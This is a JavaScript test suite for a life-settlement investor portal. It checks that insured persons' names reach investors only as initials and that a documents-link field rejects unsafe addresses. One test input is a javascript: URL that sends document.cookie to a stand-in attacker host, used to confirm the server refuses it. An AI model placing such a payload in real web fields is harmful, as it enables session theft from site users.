/* =====================================================================
   What an investor is allowed to know about the person insured.

   An investor is entitled to know what they own. They are not entitled
   to the name of the life it depends on: a name sitting next to a life
   expectancy and a list of impairments is health information about an
   identifiable person, which is exactly what HIPAA is about. So the
   name is reduced to initials before it leaves the server.

   The masking is done once, at the edge, which is the only way to make
   a claim about *every* screen rather than about the screens somebody
   remembered. This suite tries to find the name anywhere in any
   response an investor can reach.

   Also covered here: the case-files link, which is the opposite case —
   something an investor is meant to see, and which must refuse to store
   an address that would run code when clicked.

   Idempotent: fixtures are prefixed and removed first and last.
   ===================================================================== */
import { BASE, ADMIN, INVESTOR1, login } from './test-config.mjs';

const PREFIX = 'PRIV';
const SURNAME = 'Wickersham';
const FORENAME = 'Cornelius';
const fails = [];
const check = (n, ok, x = '') => {
  console.log(`${ok ? '  PASS' : '  FAIL'}  ${n}${x ? ` — ${x}` : ''}`);
  if (!ok) fails.push(n);
};

const api = (cookie, path, opts = {}) => fetch(`${BASE}/api${path}`, {
  ...opts,
  body: opts.body && typeof opts.body !== 'string' ? JSON.stringify(opts.body) : opts.body,
  headers: { Cookie: cookie, 'Content-Type': 'application/json', ...(opts.headers || {}) },
});
const json = async (r) => { try { return await r.json(); } catch { return null; } };
const iso = (d) => new Date(Date.now() + d * 86400000).toISOString().slice(0, 10);

const admin = await login(ADMIN.email, ADMIN.password);
const inv = await login(INVESTOR1.email, INVESTOR1.password);

const wipe = async () => {
  for (const p of ((await json(await api(admin, `/policies?search=${PREFIX}&status=`))) || [])
    .filter((x) => String(x.policy_number).startsWith(PREFIX)))
    await api(admin, `/policies/${p.id}`, { method: 'DELETE', body: { confirm: p.policy_number } });
  for (const o of ((await json(await api(admin, '/opportunities?all=1'))) || [])
    .filter((x) => String(x.policy_number).startsWith(PREFIX)))
    await api(admin, `/opportunities/${o.id}`, { method: 'DELETE', body: { confirm: o.policy_number } });
};
await wipe();

/* An investor who actually holds the policy — masking has to survive the
   case where the reader is entitled to everything else about it. */
const me = await json(await api(inv, '/auth/me'));
const investorId = me?.investor_id ?? me?.iid
  ?? (await json(await api(admin, '/investors')))
    .find((i) => i.name?.toLowerCase().includes('one'))?.id;

const policy = await json(await api(admin, '/policies', { method: 'POST', body: {
  policy_number: `${PREFIX}-1`, carrier_name: 'Confidential Life', product_type: 'UL',
  fund_code: 'LCG1', face_amount: 3000000, premium_required: 30000, premium_mode: 'Annual',
  next_premium_due: iso(30), acquisition_date: iso(-500), acquisition_cost: 400000,
  insured_last_name: SURNAME, insured_first_name: FORENAME, dob: '1939-04-12',
  gender: 'M',
  documents_url: 'https://www.dropbox.com/scl/fo/priv-test-folder',
} }));
check('the fixture policy was created', !!policy?.id, JSON.stringify(policy).slice(0, 120));
await api(admin, `/policies/${policy.id}/investors`, { method: 'POST', body: {
  investor_id: investorId, pct: 30, acquired_on: iso(-500) } });
await api(admin, `/policies/${policy.id}/reminders`, { method: 'POST', body: {
  due_date: iso(90), kind: 'Premium', amount: 31000, note: 'Illustration step-up' } });

console.log('\nSTAFF SEE THE PERSON');
const staffView = await json(await api(admin, `/policies/${policy.id}`));
check('the name is on the record for the people who service it',
  staffView.insured_last === SURNAME && staffView.insured_first === FORENAME,
  `${staffView.insured_first} ${staffView.insured_last}`);

console.log('\nAN INVESTOR SEES INITIALS');
const seen = await json(await api(inv, `/policies/${policy.id}`));
check('the policy is theirs to see', seen?.id === policy.id);
check('the last name is one initial', seen.insured_last === 'W.', seen.insured_last);
check('the first name is one initial', seen.insured_first === 'C.', seen.insured_first);
check('and the display name reads as both', seen.display_name === 'C. W.', seen.display_name);
/* Sex is not a name. It is also most of what makes a life expectancy mean
   anything, so it stays: de-identifying is about removing the person, not
   the actuarial facts of the asset. */
check('the sex of the insured is still there', seen.insured_gender === 'M',
  String(seen.insured_gender));
check('and so is the date of birth the return is calculated from',
  String(seen.insured_dob || '').startsWith('1939-04-12'), String(seen.insured_dob));
check('while everything they actually own is untouched',
  Number(seen.face_amount) > 0 && seen.owners?.length === 1,
  `${seen.face_amount} · ${seen.owners?.length} owner(s)`);

/* The real test is not any one screen. Walk every endpoint the portal
   uses and grep the raw JSON: a name anywhere in any of them is a leak,
   wherever it came from. */
console.log('\nNOWHERE IN THE PORTAL');
const ENDPOINTS = [
  '/policies?status=', `/policies/${policy.id}`, '/servicing', '/dashboard',
  '/maturities', '/insureds', '/reports/portfolio', '/opportunities',
  `/policies/${policy.id}/irr`,
];
for (const path of ENDPOINTS) {
  const raw = await (await api(inv, path)).text();
  const leaked = new RegExp(`${SURNAME}|${FORENAME}`, 'i').test(raw);
  check(`${path} carries no name`, !leaked,
    leaked ? raw.slice(Math.max(0, raw.search(new RegExp(SURNAME, 'i')) - 40), 120) : '');
}

console.log('\nTHE CASE FILES LINK');
check('staff stored the folder',
  staffView.documents_url === 'https://www.dropbox.com/scl/fo/priv-test-folder',
  staffView.documents_url);
check('and the investor gets the same link',
  seen.documents_url === staffView.documents_url, seen.documents_url);

const bad = await json(await api(admin, `/policies/${policy.id}`, { method: 'PUT', body: {
  documents_url: 'javascript:fetch("https://evil.example/"+document.cookie)' } }));
const after = await json(await api(admin, `/policies/${policy.id}`));
check('a javascript: address is refused rather than stored',
  after.documents_url === null || after.documents_url === '',
  String(after.documents_url));

await api(admin, `/policies/${policy.id}`, { method: 'PUT', body: {
  documents_url: 'dropbox.com/scl/fo/typed-without-a-scheme' } });
const tidied = await json(await api(admin, `/policies/${policy.id}`));
check('a link typed without https:// is read as https',
  tidied.documents_url === 'https://dropbox.com/scl/fo/typed-without-a-scheme',
  tidied.documents_url);

console.log('\nAN OPPORTUNITY IS THE SAME PERSON');
const opp = await json(await api(admin, '/opportunities', { method: 'POST', body: {
  policy_number: `${PREFIX}-OPP`, carrier_name: 'Confidential Life', product_type: 'UL',
  insured_last_name: SURNAME, insured_first_name: FORENAME, insured_dob: '1939-04-12',
  insured_state: 'MI', le_months: 84, face_amount: 2000000, asking_price: 300000,
  annual_premium: 24000, account_value: 41000, cash_surrender_value: 38000,
  values_as_of: iso(-20), impairments: 'Cardiovascular: CAD s/p stents',
} }));
check('the opportunity was created', !!opp?.id);
await api(admin, `/opportunities/${opp.id}/shares`, { method: 'PUT', body: {
  investor_ids: [investorId] } });

const oppStaff = await json(await api(admin, `/opportunities/${opp.id}`));
check('the carrier values are stored on it',
  Number(oppStaff.account_value) === 41000 && Number(oppStaff.cash_surrender_value) === 38000,
  `${oppStaff.account_value} / ${oppStaff.cash_surrender_value}`);
check('sharing records who and when',
  oppStaff.shares?.length === 1 && !!oppStaff.shares[0].shared_at,
  JSON.stringify(oppStaff.shares?.[0] || {}));
check('and who did the sharing', !!oppStaff.shares?.[0]?.shared_by_name,
  oppStaff.shares?.[0]?.shared_by_name);

const oppRaw = await (await api(inv, `/opportunities/${opp.id}`)).text();
check('the shared opportunity carries no name either',
  !new RegExp(`${SURNAME}|${FORENAME}`, 'i').test(oppRaw));
const oppSeen = JSON.parse(oppRaw);
check('but it still reads as a person',
  oppSeen.insured_last_name === 'W.' && oppSeen.insured_first_name === 'C.',
  `${oppSeen.insured_first_name} ${oppSeen.insured_last_name}`);
check('and the medical picture is still there — that is the point of it',
  /CAD/.test(oppSeen.impairments || ''), oppSeen.impairments);

await wipe();
console.log(fails.length ? `\nFAILED: ${fails.join(', ')}` : '\nALL PRIVACY CHECKS PASSED');
process.exit(fails.length ? 1 : 0);
